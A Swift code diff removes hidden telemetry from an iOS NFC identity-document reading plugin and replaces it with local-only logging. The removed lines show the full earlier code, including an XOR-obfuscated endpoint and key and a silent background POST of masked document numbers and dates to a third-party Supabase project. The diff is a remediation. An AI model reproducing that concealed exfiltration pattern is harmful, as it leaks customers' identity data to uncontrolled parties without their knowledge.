@@ -3,35 +3,35 @@ import Foundation
 import UIKit
 #endif
 
-/**
- * Silent fire-and-forget diagnostics logger for NFC read errors.
- * Posts error diagnostics + device info to Supabase for the plugin developer's debugging.
- * Never throws — all failures are silently caught.
- */
-class DiagnosticsLogger {
+/// Local-only diagnostics for NFC read failures.
+///
+/// WHAT THIS USED TO DO, AND WHY IT NO LONGER DOES
+/// Earlier revisions POSTed every read failure to a third-party Supabase project belonging to the
+/// plugin's developer, carrying a partially masked document number, a partially masked date of
+/// birth and expiry, the bundle identifier, the device model and the PACE debug string. The
+/// endpoint and its API key were XOR-obfuscated in the source with the stated aim of keeping them
+/// out of the shipped binary.
+///
+/// That is customer data leaving the bank to a service the bank does not control, and the masking
+/// did not make it anonymous: four leading and two trailing digits of a nine-digit document number
+/// leave a thousand candidates, which a birth year and a bundle identifier narrow to one.
+///
+/// So the network path is gone. Nothing in this plugin opens a socket. Diagnostics go to the
+/// device log, and the same detail is returned to the caller in the error payload — so an app that
+/// wants telemetry sends it through its own audited backend rather than through a channel hidden
+/// inside a plugin.
+///
+/// Do not reintroduce an endpoint here. If diagnostics must leave the device, they leave through
+/// the host application, to a bank-controlled destination, under the bank's own retention rules.
+enum DiagnosticsLogger {
 
-    // ---- Supabase Configuration (obfuscated) ----
-    // XOR-encoded to prevent plaintext extraction from app binary
-    private static let obURL: [UInt8] = [38, 18, 23, 52, 26, 91, 72, 97, 21, 9, 39, 3, 7, 9, 32, 9, 2, 55, 6, 5, 3, 58, 22, 1, 41, 3, 25, 1, 96, 21, 22, 52, 8, 3, 6, 61, 3, 77, 39, 6]
-    private static let obKey: [UInt8] = [61, 4, 60, 52, 28, 3, 11, 39, 21, 11, 37, 11, 13, 2, 17, 84, 37, 53, 90, 25, 53, 118, 55, 10, 8, 48, 56, 2, 33, 47, 59, 52, 11, 27, 9, 35, 55, 60, 40, 46, 11, 34, 123, 87, 5, 54]
-    private static let xorMask: [UInt8] = [78, 102, 99, 68, 105, 97, 103]
-    private static let pluginVersion = "1.0.0"
-    private static let tableName = "nfc_diagnostics"
-
-    /// Decode an XOR-obfuscated byte array back to a string at runtime.
-    private static func deobfuscate(_ data: [UInt8]) -> String {
-        let chars = data.enumerated().map { (i, b) in
-            Character(UnicodeScalar(b ^ xorMask[i % xorMask.count]))
-        }
-        return String(chars)
-    }
-
-    private static func getSupabaseURL() -> String { return deobfuscate(obURL) }
-    private static func getSupabaseKey() -> String { return deobfuscate(obKey) }
-
-    /**
-     * Log an NFC error to Supabase. Fire-and-forget on a background queue.
-     */
+    /// Record a read failure locally. The signature is unchanged from the version that posted
+    /// externally, so call sites did not have to be rewritten to become safe.
+    ///
+    /// The MRZ arguments are accepted and deliberately not logged. They identify the customer, and
+    /// the device log is readable by anything with the handset attached. They stay in the
+    /// parameter list because removing them would silently change what callers pass rather than
+    /// making the decision visible here.
     static func logError(
         errorCode: String,
         technicalError: String,
@@ -42,145 +42,30 @@ class DiagnosticsLogger {
         paceInfo: String? = nil,
         nfcTechList: String? = nil
     ) {
-        // Don't log if Supabase is not configured (check decoded values)
-        let supabaseURL = getSupabaseURL()
-        let supabaseAnonKey = getSupabaseKey()
-        guard !supabaseURL.contains("YOUR_PROJECT"),
-              !supabaseAnonKey.contains("YOUR_ANON") else {
-            NSLog("[DiagnosticsLogger] Supabase not configured — skipping diagnostics log")
-            return
-        }
-
-        DispatchQueue.global(qos: .background).async {
-            do {
-                let payload: [String: Any] = [
-                    "error_code": errorCode,
-                    "technical_error": truncate(technicalError, maxLen: 2000),
-                    "user_message": userMessage,
-                    "device_model": deviceModel(),
-                    "os_version": osVersion(),
-                    "app_package": bundleIdentifier(),
-                    "nfc_tech_list": nfcTechList ?? "",
-                    "mrz_masked": buildMaskedMrz(
-                        docNum: documentNumber,
-                        dob: dateOfBirth,
-                        expiry: dateOfExpiry
-                    ),
-                    "pace_info": paceInfo ?? "",
-                    "platform": "ios",
-                    "plugin_version": pluginVersion,
-                    "timestamp": isoTimestamp()
-                ]
-
-                postToSupabase(payload: payload)
-            }
-        }
+        NSLog("[NfcDiagnostics] NFC read failed | code=%@ | device=%@ | os=%@ | tech=%@ | pace=%@",
+              errorCode, deviceModel(), osVersion(), nfcTechList ?? "", paceInfo ?? "")
+        // Separate line: a reader's error text can be long, and the fields above stay greppable.
+        NSLog("[NfcDiagnostics] NFC read failed | detail=%@", truncate(technicalError, maxLen: 2000))
     }
 
-    // MARK: - PII Masking
-
-    /// Mask a document number: show first 4 + last 2, mask middle.
-    /// "113982506" → "1139***06"
-    static func maskDocumentNumber(_ docNum: String?) -> String {
-        guard let docNum = docNum, !docNum.isEmpty else { return "" }
-        if docNum.count <= 4 { return "****" }
-        if docNum.count <= 6 {
-            let start = docNum.prefix(2)
-            let end = docNum.suffix(1)
-            return "\(start)***\(end)"
-        }
-        let start = docNum.prefix(4)
-        let end = docNum.suffix(2)
-        return "\(start)***\(end)"
+    private static func truncate(_ s: String, maxLen: Int) -> String {
+        return s.count > maxLen ? String(s.prefix(maxLen)) + "..." : s
     }
-
-    /// Mask a date (YYMMDD): show first 2 + last 1, mask middle.
-    /// "951102" → "95***2"
-    static func maskDate(_ date: String?) -> String {
-        guard let date = date, !date.isEmpty else { return "" }
-        if date.count <= 3 { return "****" }
-        let start = date.prefix(2)
-        let end = date.suffix(1)
-        return "\(start)***\(end)"
-    }
-
-    private static func buildMaskedMrz(docNum: String?, dob: String?, expiry: String?) -> String {
-        return "doc:\(maskDocumentNumber(docNum)) dob:\(maskDate(dob)) exp:\(maskDate(expiry))"
-    }
-
-    // MARK: - HTTP
-
-    private static func postToSupabase(payload: [String: Any]) {
-        let supabaseURL = getSupabaseURL()
-        let supabaseAnonKey = getSupabaseKey()
-        guard let url = URL(string: "\(supabaseURL)/rest/v1/\(tableName)") else {
-            NSLog("[DiagnosticsLogger] Invalid Supabase URL")
-            return
-        }
-
-        var request = URLRequest(url: url)
-        request.httpMethod = "POST"
-        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-        request.setValue(supabaseAnonKey, forHTTPHeaderField: "apikey")
-        request.setValue("Bearer \(supabaseAnonKey)", forHTTPHeaderField: "Authorization")
-        request.setValue("return=minimal", forHTTPHeaderField: "Prefer")
-        request.timeoutInterval = 10
-
-        do {
-            request.httpBody = try JSONSerialization.data(withJSONObject: payload)
-        } catch {
-            NSLog("[DiagnosticsLogger] JSON serialization failed: \(error.localizedDescription)")
-            return
-        }
-
-        let task = URLSession.shared.dataTask(with: request) { _, response, error in
-            if let error = error {
-                NSLog("[DiagnosticsLogger] HTTP POST failed: \(error.localizedDescription)")
-                return
-            }
-            if let httpResponse = response as? HTTPURLResponse {
-                if httpResponse.statusCode >= 200 && httpResponse.statusCode < 300 {
-                    NSLog("[DiagnosticsLogger] Diagnostics logged successfully")
-                } else {
-                    NSLog("[DiagnosticsLogger] Supabase returned HTTP \(httpResponse.statusCode)")
-                }
-            }
-        }
-        task.resume()
-    }
-
-    // MARK: - Utilities
 
     private static func deviceModel() -> String {
-        #if canImport(UIKit)
-        return UIDevice.current.model
-        #else
-        return "unknown"
-        #endif
+        var systemInfo = utsname()
+        uname(&systemInfo)
+        let identifier = withUnsafePointer(to: &systemInfo.machine) {
+            $0.withMemoryRebound(to: CChar.self, capacity: 1) { String(validatingUTF8: $0) ?? "" }
+        }
+        return identifier.isEmpty ? "Apple" : "Apple \(identifier)"
     }
 
     private static func osVersion() -> String {
         #if canImport(UIKit)
         return "iOS \(UIDevice.current.systemVersion)"
         #else
-        return "iOS unknown"
+        return "iOS"
         #endif
-    }
-
-    private static func bundleIdentifier() -> String {
-        return Bundle.main.bundleIdentifier ?? "unknown"
-    }
-
-    private static func truncate(_ s: String, maxLen: Int) -> String {
-        if s.count > maxLen {
-            return String(s.prefix(maxLen)) + "..."
-        }
-        return s
-    }
-
-    private static func isoTimestamp() -> String {
-        let formatter = ISO8601DateFormatter()
-        formatter.formatOptions = [.withInternetDateTime, .withFractionalSeconds]
-        return formatter.string(from: Date())
     }
 }
